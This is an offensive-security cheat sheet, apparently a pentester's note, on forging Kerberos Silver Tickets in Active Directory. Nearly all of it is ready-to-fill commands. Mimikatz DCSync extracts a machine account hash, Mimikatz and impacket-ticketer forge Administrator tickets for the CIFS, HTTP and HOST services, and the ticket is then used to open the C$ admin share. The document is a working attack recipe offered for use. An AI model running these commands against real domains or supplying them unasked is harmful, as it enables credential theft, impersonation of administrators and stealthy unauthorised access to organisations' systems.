---
tags:
  - Active_Directory
  - Advanced
  - Credential_Access
  - Impacket
  - Kerberos
  - Mimikatz
  - Persistence
  - Silver_Ticket
  - Windows
---

## Silver Ticket
resources: [HackTricks Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)

> [!info] Forge a TGS for a specific service. Requires the service account's NTLM hash. More stealthy than Golden Ticket (no DC contact needed).

### Common Service SPNs
```
cifs/<hostname>     - File shares (SMB)
http/<hostname>     - Web services, WinRM
host/<hostname>     - Scheduled tasks, WMI
ldap/<hostname>     - LDAP operations
mssql/<hostname>    - SQL Server
```

### Prerequisites
> [!important] Need service account hash and domain SID.

```powershell
# Get domain SID
(Get-ADDomain).DomainSID.Value
```

```powershell
# Get computer account hash (for CIFS, HOST, etc.)
.\mimikatz.exe "lsadump::dcsync /domain:<Domain> /user:<ComputerName>$" "exit"
```

## Create Silver Ticket with Mimikatz [Remote]

### CIFS (file shares)
```powershell
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:cifs /rc4:<ServiceHash> /ptt" "exit"
```

### HTTP (WinRM/PSRemoting)
```powershell
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:http /rc4:<ServiceHash> /ptt" "exit"
```

### HOST (scheduled tasks, WMI)
```powershell
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:host /rc4:<ServiceHash> /ptt" "exit"
```

## Create Silver Ticket from Kali [Local]
```bash
impacket-ticketer -nthash <ServiceHash> -domain-sid <DomainSID> -domain <Domain> -spn cifs/<TargetFQDN> Administrator
```

```bash
# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass <Domain>/Administrator@<TargetFQDN>
```

## Verify and Use
```powershell
klist
dir \\<TargetFQDN>\C$
```
